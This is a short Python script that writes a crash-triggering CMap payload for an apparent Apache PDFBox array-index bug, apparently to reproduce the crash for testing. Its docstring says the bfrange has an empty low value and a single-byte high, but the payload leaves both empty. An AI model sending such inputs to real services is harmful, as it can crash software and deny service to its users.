#!/usr/bin/env python3
"""Generate PoC for pdfbox-cmap-bfrange-aioob.

CMapParser.increment() walks a CID range byte-by-byte from low to high.
When the bfrange `<low> <high> <value>` is specified with an empty `<low>`
hex literal and a single-byte `<high>`, the helper decrements a length-0
byte array, triggering ArrayIndexOutOfBoundsException at index -1.

Payload is verbatim from upstream PR #411 Reproduce.java.
"""

def create_poc(output='poc.bin'):
    blob = b'1 beginbfrange\n<> <> <2223>\nendbfrange'
    with open(output, 'wb') as f:
        f.write(blob)
    print(f"wrote {output} ({len(blob)} bytes)")


if __name__ == '__main__':
    create_poc()
